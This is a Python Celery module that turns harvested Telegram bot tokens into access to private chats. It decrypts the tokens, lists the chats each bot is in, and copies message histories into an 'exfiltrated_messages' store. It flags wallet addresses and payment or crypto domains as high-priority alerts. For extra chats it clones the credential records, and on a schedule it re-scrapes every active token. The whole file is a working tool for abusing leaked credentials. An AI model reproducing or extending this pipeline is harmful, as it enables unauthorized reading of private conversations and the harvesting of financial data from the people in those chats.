"""Scrape flow task definitions."""

from .common import *

from .broadcast import broadcast_pending

HIGH_PRIORITY_DOMAIN_KEYWORDS = (
    "wallet",
    "pay",
    "payment",
    "checkout",
    "exchange",
    "crypto",
    "blockchain",
)

def _is_positive_scraped_message_id(value: Any) -> bool:
    """Scraped chat-message IDs occupy only the positive integer namespace."""
    return isinstance(value, int) and not isinstance(value, bool) and value > 0

async def _send_alert(message: str) -> None:
    """Best-effort control-channel notification for high-priority telemetry."""
    try:
        await get_broadcaster().send_log(message)
    except Exception as e:
        logger.debug(f"[TelemetryParser] Alert dispatch skipped: {e}")

def _is_high_priority_indicator(indicator: dict[str, Any]) -> bool:
    indicator_type = indicator.get("indicator_type")
    indicator_value = str(indicator.get("indicator_value") or "").lower()
    if indicator_type == "wallet_address":
        return True
    if indicator_type != "network_domain":
        return False
    return any(keyword in indicator_value for keyword in HIGH_PRIORITY_DOMAIN_KEYWORDS)

async def _hydrate_message_rows_for_index(message_rows: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Ensure rows have the exfiltrated_messages UUID needed by telemetry_indicators."""
    hydrated: list[dict[str, Any]] = []
    missing_by_credential: dict[str, list[int]] = defaultdict(list)
    source_by_key: dict[tuple[str, int], dict[str, Any]] = {}

    for row in message_rows:
        credential_id = row.get("credential_id")
        telegram_msg_id = row.get("telegram_msg_id")
        if row.get("id") and credential_id:
            hydrated.append(row)
            continue
        if credential_id and telegram_msg_id is not None:
            try:
                telegram_id_int = int(telegram_msg_id)
            except (TypeError, ValueError):
                continue
            key = (str(credential_id), telegram_id_int)
            source_by_key[key] = row
            missing_by_credential[str(credential_id)].append(telegram_id_int)

    for credential_id, telegram_ids in missing_by_credential.items():
        unique_ids = sorted(set(telegram_ids))
        for start in range(0, len(unique_ids), 100):
            chunk = unique_ids[start:start + 100]
            response = await async_execute(
                db.table("exfiltrated_messages")
                .select("id, credential_id, telegram_msg_id, content, media_type, file_meta")
                .eq("credential_id", credential_id)
                .in_("telegram_msg_id", chunk)
            )
            for db_row in response.data or []:
                try:
                    key = (str(db_row.get("credential_id")), int(db_row.get("telegram_msg_id")))
                except (TypeError, ValueError):
                    continue
                source_row = source_by_key.get(key, {})
                merged = dict(source_row)
                merged.update(db_row)
                hydrated.append(merged)

    return hydrated

async def _index_telemetry_indicators(message_rows: list[dict[str, Any]]) -> int:
    """Best-effort structured indicator indexing for newly inserted messages."""
    if not message_rows:
        return 0

    try:
        from app.services.telemetry_parser import TelemetryEntityParser

        message_rows = await _hydrate_message_rows_for_index(message_rows)
        indicator_rows: list[dict[str, Any]] = []
        for row in message_rows:
            message_id = row.get("id")
            credential_id = row.get("credential_id")
            if not message_id or not credential_id:
                continue

            raw_payload = row.get("raw_payload")
            if not isinstance(raw_payload, dict):
                raw_payload = row.get("file_meta") if isinstance(row.get("file_meta"), dict) else {}

            indicators = TelemetryEntityParser.parse_payload(row.get("content") or "", raw_payload)
            for indicator in indicators:
                indicator_rows.append({
                    "credential_id": credential_id,
                    "message_id": message_id,
                    "indicator_type": indicator["type"],
                    "indicator_value": indicator["value"],
                    "raw_context": {
                        "telegram_msg_id": row.get("telegram_msg_id"),
                        "media_type": row.get("media_type"),
                    },
                })

        if not indicator_rows:
            return 0

        result = await asyncio.wait_for(
            async_execute(
                db.table("telemetry_indicators").upsert(
                    indicator_rows,
                    on_conflict="message_id,indicator_type,indicator_value",
                    ignore_duplicates=True,
                )
            ),
            timeout=10.0,
        )
        inserted_rows = result.data or []
        high_priority_rows = [
            row for row in inserted_rows
            if _is_high_priority_indicator(row)
        ]
        if high_priority_rows:
            preview = ", ".join(
                str(row.get("indicator_value") or "")[:80]
                for row in high_priority_rows[:5]
            )
            await _send_alert(
                "**Telemetry Entity Indexed**\n"
                f"New financial or high-priority infrastructure strings: `{preview}`"
            )
        return len(inserted_rows)
    except Exception as e:
        logger.debug(f"[TelemetryParser] Indicator indexing skipped: {e}")
        return 0

async def _merge_credential_meta(cred_id: str, patch: dict[str, Any]) -> dict[str, Any]:
    """Merge a metadata patch without overwriting unrelated enrichment keys."""
    fresh_meta_res = await async_execute(
        db.table("discovered_credentials").select("meta").eq("id", cred_id).single()
    )
    existing_meta = {}
    if isinstance(fresh_meta_res.data, dict):
        existing_meta = fresh_meta_res.data.get("meta") or {}
    merged_meta = dict(existing_meta)
    merged_meta.update(patch)
    await async_execute(
        db.table("discovered_credentials").update({"meta": merged_meta}).eq("id", cred_id)
    )
    return merged_meta

async def _fetch_bot_capabilities(
    bot_token: str,
    chat_id: int | None = None,
    get_me_result: dict | None = None,
) -> dict:
    """
    Fetch bot capability metadata from the Telegram Bot API.
    Returns dict with keys: can_join_groups, can_read_all_group_messages,
    supports_inline_queries, default_admin_rights_groups,
    default_admin_rights_channels, description, short_description, linked_chat_id.
    Never raises — returns {} on total failure, partial dict on partial failure.
    """
    capabilities: dict = {}
    base = f"https://api.telegram.org/bot{bot_token}"

    async def _get(path: str) -> dict | None:
        try:
            async with httpx.AsyncClient(timeout=10.0) as _hc:
                r = await _hc.get(f"{base}/{path}")
                if r.status_code == 200:
                    return r.json().get("result") or {}
        except Exception as e:
            logger.debug(f"[BotCapabilities] {path} failed: {e}")
        return None

    # Reuse existing getMe result if provided, else fetch fresh
    me = get_me_result or await _get("getMe")
    if me:
        capabilities["can_join_groups"] = bool(me.get("can_join_groups"))
        capabilities["can_read_all_group_messages"] = bool(me.get("can_read_all_group_messages"))
        capabilities["supports_inline_queries"] = bool(me.get("supports_inline_queries"))

    # Default admin rights for groups
    groups_rights = await _get("getMyDefaultAdministratorRights?for_channels=false")
    capabilities["default_admin_rights_groups"] = groups_rights if groups_rights else None

    # Default admin rights for channels
    channel_rights = await _get("getMyDefaultAdministratorRights?for_channels=true")
    capabilities["default_admin_rights_channels"] = channel_rights if channel_rights else None

    # Bot description
    desc = await _get("getMyDescription")
    capabilities["description"] = (desc or {}).get("description", "")

    short_desc = await _get("getMyShortDescription")
    capabilities["short_description"] = (short_desc or {}).get("short_description", "")

    # Linked chat from primary chat if available
    capabilities["linked_chat_id"] = None
    if chat_id:
        chat_info = await _get(f"getChat?chat_id={chat_id}")
        if chat_info:
            capabilities["linked_chat_id"] = chat_info.get("linked_chat_id")

    return capabilities

def _strategy_attempt_to_dict(attempt: Any) -> dict[str, Any]:
    if hasattr(attempt, "to_dict"):
        return attempt.to_dict()
    if isinstance(attempt, dict):
        return dict(attempt)
    return {
        "name": getattr(attempt, "name", "unknown"),
        "success": getattr(attempt, "success", False),
        "message_count": getattr(attempt, "message_count", 0),
        "reason": str(getattr(attempt, "reason", "")),
        "retryable": getattr(attempt, "retryable", False),
        "evidence": getattr(attempt, "evidence", {}),
    }

async def _persist_scrape_classification(cred_id: str, scrape_result: Any) -> None:
    from datetime import datetime

    if hasattr(scrape_result, "to_metadata"):
        meta_patch = scrape_result.to_metadata()
    else:
        meta_patch = {
            "last_scrape_reason": "success" if scrape_result else "no_new_messages",
            "last_scrape_retryable": False,
            "last_scrape_evidence": {"legacy_result": True},
            "last_scrape_strategy_attempts": [],
            "last_scrape_next_action": "persist_messages" if scrape_result else "no_action",
        }

    meta_patch["last_scrape_at"] = datetime.now(UTC).isoformat()
    await _merge_credential_meta(cred_id, meta_patch)

    reason = meta_patch.get("last_scrape_reason")
    attempts = meta_patch.get("last_scrape_strategy_attempts") or []
    AuditLogger.log(
        AuditEvent.SCRAPE_CLASSIFIED,
        credential_id=cred_id,
        details={
            "reason": reason,
            "retryable": meta_patch.get("last_scrape_retryable"),
            "next_action": meta_patch.get("last_scrape_next_action"),
            "message_count": len(getattr(scrape_result, "messages", scrape_result or [])),
            "strategy_count": len(attempts),
        },
        success=reason in ("success", "no_new_messages"),
    )
    for attempt in attempts:
        attempt_data = _strategy_attempt_to_dict(attempt)
        AuditLogger.log(
            AuditEvent.SCRAPE_STRATEGY_ATTEMPT,
            credential_id=cred_id,
            details=attempt_data,
            success=bool(attempt_data.get("success")),
        )

@app.task(name="flow.exfiltrate_chat", soft_time_limit=2400, time_limit=2500)
def exfiltrate_chat(cred_id: str):
    """
    1. Decrypt token.
    2. Scrape history.
    3. Save to DB.
    4. Trigger broadcast.
    """
    try:
        from app.workers.celery_app import get_worker_loop
        return get_worker_loop().run_until_complete(_exfiltrate_logic(cred_id))
    except SoftTimeLimitExceeded:
        logger.warning(f"⏰ [Exfil] Soft time limit exceeded for {cred_id}. Saving partial results.")
        return f"Exfiltration timed out for {cred_id} (partial results may have been saved)."

async def _exfiltrate_logic(cred_id: str):
    logger.info(f"🕵️ [Exfil] Starting process for CredID: {cred_id}")

    broadcaster = get_broadcaster()
    await broadcaster.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")

    # T010: Observability hook
    from app.core.audit import AuditLogger
    from app.core.metrics import metrics
    metrics.inc("exfiltrate.started")
    AuditLogger.log(
        event_type="exfiltrate.start",
        credential_id=cred_id,
        details={"cred_id": cred_id}
    )

    # Fetch credential
    response = await async_execute(db.table("discovered_credentials").select("bot_token, chat_id, meta").eq("id", cred_id))
    if not response.data:
        logger.error(f"❌ [Exfil] Credential {cred_id} not found in DB.")
        return f"Credential {cred_id} not found."

    record = response.data[0]
    encrypted_token = record["bot_token"]
    chat_id = record["chat_id"]

    logger.info(f"    [Exfil] Found Chat ID: {chat_id}")

    # Guard: never exfiltrate the monitor hub — circular scrape protection.
    # Use the async resolver so the first call (cold cache) doesn't block the event loop
    # via a synchronous httpx.get() inside an async task.
    from app.services.scraper_srv import _resolve_monitor_group_ids_async
    if chat_id:
        monitor_ids = await _resolve_monitor_group_ids_async()
        if str(chat_id) in monitor_ids or chat_id in monitor_ids:
            logger.warning(f"⛔ [Exfil] Skipping cred {cred_id} — chat_id {chat_id} is the monitor hub.")
            await async_execute(
                db.table("discovered_credentials")
                .update({"chat_id": None})
                .eq("id", cred_id)
            )
            return f"Skipped: chat_id {chat_id} is monitor hub — cleared."


    try:
        if not encrypted_token.startswith("gAAAA"):
            # Likely raw token from "bugged" scanner run
            bot_token = encrypted_token
            # SELF-HEAL: Encrypt and update DB BEFORE using the token downstream
            try:
                new_enc = security.encrypt(bot_token)
                await async_execute(db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id))
                logger.info(f"    🩹 [Exfil] Self-healed unencrypted token for {cred_id}")
            except Exception as heal_err:
                logger.warning(f"    ⚠️ [Exfil] Self-heal encrypt failed for {cred_id}: {heal_err}")
        else:
            bot_token = security.decrypt(encrypted_token).strip()
    except Exception as e:
        # Invalid token or key mismatch
        logger.error(f"❌ [Exfil] Decryption failed for {cred_id}: {e}")
        await _mark_credential_revoked(cred_id, "exfil_decryption_failed")
        return f"Decryption failed for {cred_id}: {e}"

    # Validate decrypted token format before use
    from app.utils.helpers import is_valid_telegram_token
    if not is_valid_telegram_token(bot_token):
        logger.error(f"❌ [Exfil] Decrypted token has invalid format for {cred_id}. Marking revoked.")
        await _mark_credential_revoked(cred_id, "exfil_invalid_token_format")
        return f"Invalid token format after decryption for {cred_id}"

    # HTTP Preflight Check — verify token before heavy scrape
    try:
        await scraper_service._probe_gateway_telemetry(encrypted_token, cred_id)
        updates, meta_info, is_revoked = await scraper_service._http_preflight_check(bot_token)
        if is_revoked:
            await _mark_credential_revoked(cred_id, "exfil_preflight_revoked")
            return "Record inactive; marked revoked during preflight."
        if meta_info:
            await _merge_credential_meta(cred_id, meta_info)
        if updates:
            valid_updates = [
                u for u in updates
                if isinstance(u, dict) and _is_positive_scraped_message_id(u.get("telegram_msg_id"))
            ]
            invalid_count = len(updates) - len(valid_updates)
            if invalid_count:
                logger.warning(
                    f"[Exfil] Dropping {invalid_count} preflight messages with non-positive or invalid IDs for {cred_id}"
                )
            for u in valid_updates:
                u["credential_id"] = cred_id
            if valid_updates:
                preflight_result = await async_execute(
                    db.table("exfiltrated_messages").upsert(
                        valid_updates,
                        on_conflict="credential_id,telegram_msg_id",
                        ignore_duplicates=True
                    )
                )
                await _index_telemetry_indicators(preflight_result.data or valid_updates)
    except Exception as e:
        logger.warning(f"⚠️ [Exfil] Preflight check failed for {cred_id}: {e}")

    # Scrape
    try:
        logger.info(f"⏳ [Exfil] Calling scraper service for chat {chat_id}...")
        await broadcaster.send_log(f"⏳ Scraping chat `{chat_id}`...")

        scrape_result = await scraper_service.scrape_history(
            bot_token, chat_id, credential_id=cred_id
        )
        await _persist_scrape_classification(cred_id, scrape_result)
        messages = list(getattr(scrape_result, "messages", scrape_result))

        logger.info(f"✅ [Exfil] Scraper returned {len(messages)} messages.")
        reason = getattr(scrape_result, "reason_code", "success" if messages else "no_new_messages")
        await broadcaster.send_log(f"✅ Scraped {len(messages)} messages (`{reason}`).")
    except SoftTimeLimitExceeded:
        logger.warning(f"⏰ [Exfil] Scraping timed out for chat {chat_id}. Continuing with 0 messages.")
        from app.services._scraper.results import ScrapeReason, ScrapeResult

        await _persist_scrape_classification(
            cred_id,
            ScrapeResult(
                messages=[],
                reason=ScrapeReason.TIMEOUT,
                retryable=True,
                evidence={"exception": "SoftTimeLimitExceeded", "chat_id": chat_id},
                strategy_attempts=[],
            ),
        )
        messages = []
    except Exception as e:
        err_str = str(e)
        from app.services._scraper.results import ScrapeResultClassifier

        classified = ScrapeResultClassifier().result_from_attempts(
            [],
            [ScrapeResultClassifier().classify_exception(e, strategy="scrape_history")],
            evidence={"chat_id": chat_id},
        )
        await _persist_scrape_classification(cred_id, classified)
        # Only mark revoked for definitive Telegram rejection — NOT transient errors.
        # Transient: network failures, timeouts, flood waits, server errors.
        # Permanent: bot kicked/banned, token invalid (401), account deactivated.
        permanent_errors = (
            "AuthKeyUnregisteredError" in err_str
            or "UserDeactivatedBanError" in err_str
            or ("401" in err_str and "Unauthorized" in err_str)  # explicit parens — AND binds tighter than OR
        )
        if permanent_errors:
            logger.error(f"❌ [Exfil] Permanent scraper failure for {cred_id}: {e}. Marking revoked.")
            await _mark_credential_revoked(cred_id, "exfil_permanent_scraper_failure")
        else:
            logger.warning(f"⚠️ [Exfil] Transient scraper failure for {cred_id}: {e}. Leaving status for retry.")
        return f"Scraping failed: {e}"

    # Save Messages (using UPSERT to prevent duplicates)
    new_count = 0
    index_candidates: list[dict[str, Any]] = []
    for msg in messages:
        message_id = msg.get("telegram_msg_id") if isinstance(msg, dict) else None
        if not _is_positive_scraped_message_id(message_id):
            logger.warning(
                f"[Exfil] Dropping scraped message with non-positive or invalid ID {message_id!r} for {cred_id}"
            )
            continue
        msg["credential_id"] = cred_id

        # SANITIZE: Remove keys that don't exist in the 'exfiltrated_messages' table
        # ScraperService adds 'chat_id' for context, but DB doesn't have it.
        db_payload = msg.copy()
        if "chat_id" in db_payload:
            del db_payload["chat_id"]

        try:
            # Use upsert: insert if not exists, ignore if duplicate
            result = await async_execute(db.table("exfiltrated_messages").upsert(
                db_payload,
                on_conflict="credential_id,telegram_msg_id",  # Conflict columns
                ignore_duplicates=True  # Don't update existing, just skip
            ))

            if result.data:
                new_count += 1
                index_candidates.extend(result.data)
            else:
                index_candidates.append(db_payload)
        except Exception as e:
            logger.error(f"    ❌ Insert error for msg {msg.get('telegram_msg_id')}: {e}")

    if index_candidates:
        await _index_telemetry_indicators(index_candidates)

    if new_count > 0:
        await broadcaster.send_log(f"💾 Saved {new_count} new messages to DB.")

    # Trigger Broadcast
    if new_count > 0:
        broadcast_pending.delay()

    return f"Exfiltrated {new_count} new messages."

@app.task(name="flow.enrich_credential")
def enrich_credential(cred_id: str):
    """
    1. Decrypt token.
    2. Discover chats (Enrichment).
    3. Update DB with Chat ID(s).
    4. Trigger Exfiltration.
    """
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(_enrich_logic(cred_id))

async def _enrich_logic(cred_id: str):
    logger.info(f"✨ [Enrich] Starting enrichment for credential {cred_id}")

    # T010: Observability hook
    from app.core.audit import AuditLogger
    from app.core.metrics import metrics
    metrics.inc("enrich.started")
    AuditLogger.log(
        event_type="enrich.start",
        credential_id=cred_id,
        details={"cred_id": cred_id}
    )

    broadcaster = get_broadcaster()
    await broadcaster.send_log(f"✨ Starting enrichment for CredID: `{cred_id}`")
    # Fetch credential
    response = await async_execute(db.table("discovered_credentials").select("bot_token").eq("id", cred_id))
    if not response.data:
        logger.error(f"❌ [Enrich] Credential {cred_id} not found.")
        return f"Credential {cred_id} not found."

    record = response.data[0]

    # Decrypt or Handle Legacy/Raw
    try:
        if not record["bot_token"].startswith("gAAAA"):
             # Likely raw token
            bot_token = record["bot_token"]
            # SELF-HEAL: Encrypt and update DB BEFORE using the token downstream
            try:
                new_enc = security.encrypt(bot_token)
                await async_execute(db.table("discovered_credentials").update({"bot_token": new_enc}).eq("id", cred_id))
                logger.info(f"    🩹 [Enrich] Self-healed unencrypted token for {cred_id}")
            except Exception as heal_err:
                logger.warning(f"    ⚠️ [Enrich] Self-heal encrypt failed for {cred_id}: {heal_err}")
        else:
            bot_token = security.decrypt(record["bot_token"]).strip()
    except Exception as e:
        logger.error(f"❌ [Enrich] Decryption failed: {e}")
        await _mark_credential_revoked(cred_id, "enrich_decryption_failed")
        return f"Decryption failed: {e}"

    # Validate decrypted token format before use
    from app.utils.helpers import is_valid_telegram_token
    if not is_valid_telegram_token(bot_token):
        logger.error(f"❌ [Enrich] Decrypted token has invalid format for {cred_id}. Marking revoked.")
        await _mark_credential_revoked(cred_id, "enrich_invalid_token_format")
        return f"Invalid token format after decryption for {cred_id}"

    # Discover
    bot_info = {}
    try:
        logger.info("🔎 [Enrich] Discovering chats via ScraperService...")
        bot_info, chats = await scraper_service.discover_chats(bot_token, credential_id=cred_id)
        logger.info(f"✅ [Enrich] Discovery returned {len(chats) if chats else 0} chats.")
        if chats:
            chat_list = ", ".join([f"{c['name']} ({c['id']})" for c in chats])
            logger.info(f"    [Enrich] Chats found: {chat_list}")
            await broadcaster.send_log(f"✅ Discovered chats: {chat_list}")
        else:
            logger.info("    [Enrich] No chats found.")
            await broadcaster.send_log("⚠️ No chats found.")
    except Exception as e:
        logger.error(f"❌ [Enrich] Discovery failed: {e}")
        return f"Discovery failed: {e}"

    # Filter out synthetic "bot_self" entries — these are placeholders, not real chats.
    # discover_chats() inserts them when the token is valid but has no recent activity;
    # using the bot's own Telegram ID as a chat_id causes failed exfiltration.
    real_chats = [c for c in chats if c.get("type") != "bot_self"]

    if not real_chats:
        # Valid token, but no open dialogs (or only bot_self placeholder).
        logger.info("    [Enrich] No real chats via API. Skipping Orphan Match (Disabled).")
        # Mark as 'active' - token works but truly no chats accessible
        await async_execute(db.table("discovered_credentials").update({"status": "active"}).eq("id", cred_id))
        return "Token valid, but no real chats found. Status updated to 'active'."

    chats = real_chats

    # Update Logic
    # 1. Update the ORIGINAL record with the first chat found.
    # 2. If more chats, create NEW records (clones).

    first_chat = chats[0]
    logger.info(f"📝 [Enrich] Updating credential with Primary Chat: {first_chat['name']} (ID: {first_chat['id']})")

    # Update primary
    # Pre-create Topic with NEW FORMAT: @username / botid
    from app.core.config import settings

    bot_username = bot_info.get("username") or ""
    bot_id = bot_info.get("id") or ""

    # Fallback: if discover_chats didn't return bot info, try a direct getMe()
    if not bot_username or not bot_id:
        try:
            async with httpx.AsyncClient(timeout=10.0) as _hc:
                gm = await _hc.get(f"https://api.telegram.org/bot{bot_token}/getMe")
                if gm.status_code == 200:
                    gm_data = gm.json().get("result", {})
                    bot_username = bot_username or gm_data.get("username", "")
                    bot_id = bot_id or gm_data.get("id", "")
        except Exception as _swallowed:
            logger.debug(f"[suppressed] {_swallowed}")

    bot_username = bot_username or "unknown"
    bot_id = bot_id or "0"
    capabilities = await _fetch_bot_capabilities(
        bot_token,
        chat_id=first_chat["id"] if real_chats else None,
    )
    topic_name = f"@{bot_username} / {bot_id}"

    topic_id = 0
    try:
        topic_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
        # Header handled by ensure_topic automatically
    except Exception as e:
        logger.warning(f"    ⚠️ [Enrich] Topic creation/header warning: {e}")

    # Always re-fetch meta immediately before writing to minimise the race window
    # (another worker may have enriched or set topic_id between our earlier fetch and now)
    cur = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
    meta_payload = dict((cur.data or {}).get("meta") or {})
    meta_payload.update({
        "chat_name": first_chat["name"],
        "type": first_chat["type"],
        "enriched": True,
        "bot_username": bot_username,
        "bot_id": bot_id,
    })
    if topic_id:
        meta_payload["topic_id"] = topic_id
    meta_payload["capabilities"] = capabilities

    await async_execute(db.table("discovered_credentials").update({
        "chat_id": first_chat["id"],
        "meta": meta_payload,
    }).eq("id", cred_id))

    # Fire webhook alert (fire-and-forget — never blocks enrich)
    try:
        from datetime import datetime

        from app.core.webhook import dispatch_alert as _dispatch_alert
        await _dispatch_alert({
            "event": "credential_activated",
            "timestamp": datetime.now(UTC).isoformat(),
            "credential_id": cred_id,
            "bot_username": bot_username,
            "bot_id": str(bot_id),
            "chat_id": first_chat["id"],
            "chat_name": first_chat["name"],
            "capabilities": meta_payload.get("capabilities", {}),
        })
    except Exception as _wh_exc:
        logger.debug(f"[Webhook] dispatch_alert failed: {_wh_exc}")

    # Trigger Exfiltration for Primary
    logger.info(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
    await broadcaster.send_log("🚀 Triggering background exfiltration task.")
    exfiltrate_chat.delay(cred_id)

    msg = f"Enriched {cred_id} with chat {first_chat['id']}."

    # --- Multi-chat: create sibling credential records for every additional chat ---
    if len(chats) > 1:
        import hashlib as _hashlib
        cloned = 0
        for extra_chat in chats[1:]:
            extra_chat_id = extra_chat["id"]
            # Synthetic hash: unique per (token, chat) pair so the UNIQUE constraint holds
            extra_hash = _hashlib.sha256(
                f"{bot_token}|chat:{extra_chat_id}".encode()
            ).hexdigest()

            try:
                existing = await async_execute(
                    db.table("discovered_credentials").select("id").eq("token_hash", extra_hash)
                )
                if existing.data:
                    continue  # already exists from a previous enrich run

                sibling_data = {
                    "bot_token": security.encrypt(bot_token),
                    "token_hash": extra_hash,
                    "chat_id": extra_chat_id,
                    "chat_name": extra_chat.get("name"),
                    "chat_type": extra_chat.get("type"),
                    "bot_id": str(bot_id),
                    "bot_username": bot_username,
                    "source": "multi_chat",
                    "status": "active",
                    "meta": {
                        "bot_username": bot_username,
                        "bot_id": bot_id,
                        "topic_id": topic_id,  # share same monitor topic thread
                        "parent_credential_id": cred_id,
                        "enriched": True,
                    },
                }
                res = await async_execute(db.table("discovered_credentials").insert(sibling_data))
                if res.data:
                    sibling_id = res.data[0]["id"]
                    exfiltrate_chat.delay(sibling_id)
                    cloned += 1
                    logger.info(
                        f"    ➕ [Enrich] Created sibling credential {sibling_id} for chat {extra_chat_id}"
                    )
            except Exception as e:
                logger.error(f"    ❌ [Enrich] Failed to clone for chat {extra_chat_id}: {e}")

        if cloned:
            msg += f" (+{cloned} sibling chats queued)"
            await broadcaster.send_log(f"➕ Queued {cloned} additional chat(s) for exfiltration.")

    return msg

@app.task(name="flow.rescrape_active")
def rescrape_active():
    """
    Periodic task to re-scrape all active credentials for new messages.
    Runs every 4 hours to catch new activity in monitored chats.
    """
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(_rescrape_active_logic())

async def _rescrape_active_logic():
    """
    Cursor-based rescrape: advances through ALL active credentials across successive runs.
    Each run processes one batch starting from where the previous run left off,
    ensuring every credential is eventually rescraped regardless of table size.
    """
    import os

    from app.core.metrics import metrics
    from app.core.redis_srv import redis_srv
    metrics.inc("rescrape.started")

    BATCH_SIZE = int(os.getenv("RESCRAPE_BATCH_SIZE", 50))  # noqa: N806 — function-scoped constant
    # Stagger task dispatch: spread BATCH_SIZE tasks across RESCRAPE_SPREAD_SECONDS
    # so they don't all hit the UserAgent simultaneously and trigger FloodWait.
    # Default: 50 tasks over 300s = one task every 6s.
    SPREAD_SECONDS = int(os.getenv("RESCRAPE_SPREAD_SECONDS", 300))  # noqa: N806 — function-scoped constant
    # Backpressure threshold: skip queueing if the scrape queue already has this
    # many pending tasks.  exfiltrate_chat routes to the 'scrape' queue and each
    # task can hold a session lock for 30-300s.  Piling on more tasks while the
    # previous batch is still draining causes the session-acquisition retry loop
    # to spin at 0% CPU useful work and inflates scrape queue depth unboundedly.
    # Default: 2 × BATCH_SIZE (allow one overlap batch in flight, then gate).
    BACKPRESSURE_THRESHOLD = int(os.getenv("RESCRAPE_BACKPRESSURE_THRESHOLD", BATCH_SIZE * 2))  # noqa: N806 — function-scoped constant
    CURSOR_KEY = "rescrape:cursor:last_id"  # noqa: N806 — function-scoped constant

    broadcaster = get_broadcaster()

    # Guard: if ALL UserAgent sessions are on cooldown, skip this run entirely.
    # Queueing tasks when the UA is fully restricted just wastes worker slots and
    # causes noisy "All sessions failed" log spam.
    ua_sessions_available = False
    try:
        import glob
        import os.path as _osp
        session_files = glob.glob("/app/sessions/*.session")
        for sf in session_files:
            sname = _osp.splitext(_osp.basename(sf))[0]
            if not redis_srv.is_on_cooldown(f"user_agent:{sname}"):
                ua_sessions_available = True
                break
    except Exception:
        ua_sessions_available = True  # fail open

    if not ua_sessions_available:
        msg = "⏳ **Re-scrape**: All UserAgent sessions on FloodWait cooldown — skipping this run to avoid task noise."
        logger.info(msg)
        await broadcaster.send_log(msg)
        return msg

    # Backpressure gate: don't pile new tasks onto an already-deep scrape queue.
    # exfiltrate_chat routes to the 'scrape' queue.  Each task can hold a session
    # lock for 30-300s, so a backlog of tasks just spins the session-acquisition
    # retry loop without making progress.
    try:
        scrape_queue_depth = redis_client.llen("scrape")
    except Exception:
        scrape_queue_depth = 0  # fail open — don't block rescrape on Redis errors

    if scrape_queue_depth >= BACKPRESSURE_THRESHOLD:
        msg = (
            f"⏸️ **Re-scrape**: Skipping — scrape queue has {scrape_queue_depth} pending tasks "
            f"(threshold: {BACKPRESSURE_THRESHOLD}).  Waiting for existing tasks to drain."
        )
        logger.info(msg)
        await broadcaster.send_log(msg)
        return msg

    # Read cursor from Redis — empty string means start of table
    last_id = redis_client.get(CURSOR_KEY) or ""

    try:
        query = (
            db.table("discovered_credentials")
            .select("id")
            .eq("status", "active")
            .not_.is_("chat_id", "null")
            .order("id", desc=False)
            .limit(BATCH_SIZE)
        )
        if last_id:
            query = query.gt("id", last_id)

        response = await async_execute(query)
        credentials = response.data or []

        if not credentials:
            # End of table — reset cursor so the next run starts over
            redis_client.delete(CURSOR_KEY)
            await broadcaster.send_log("🔄 **Re-scrape**: Full table scanned — cursor reset to start.")
            return "Rescrape cursor reset (full table covered)."

        # Advance cursor to last ID in this batch
        new_cursor = credentials[-1]["id"]
        redis_client.set(CURSOR_KEY, new_cursor)

        await broadcaster.send_log(
            f"🔄 **Re-scrape**: Queuing {len(credentials)} credentials (cursor: ...{new_cursor[-8:]}, "
            f"staggered over {SPREAD_SECONDS}s)..."
        )

        queued = 0
        interval = SPREAD_SECONDS / max(len(credentials), 1)
        for i, cred in enumerate(credentials):
            try:
                # countdown staggers each task: task 0 runs now, task 1 runs in interval*1s, etc.
                exfiltrate_chat.apply_async(args=[cred["id"]], countdown=int(i * interval))
                queued += 1
            except Exception as e:
                logger.error(f"Failed to queue exfiltration for {cred['id']}: {e}")

        msg = f"🏁 **Re-scrape**: Queued {queued}/{len(credentials)} credentials (spread: ~{interval:.0f}s apart)."
        await broadcaster.send_log(msg)
        return msg

    except Exception as e:
        error_msg = f"❌ **Re-scrape** failed: {e}"
        await broadcaster.send_log(error_msg)
        return error_msg
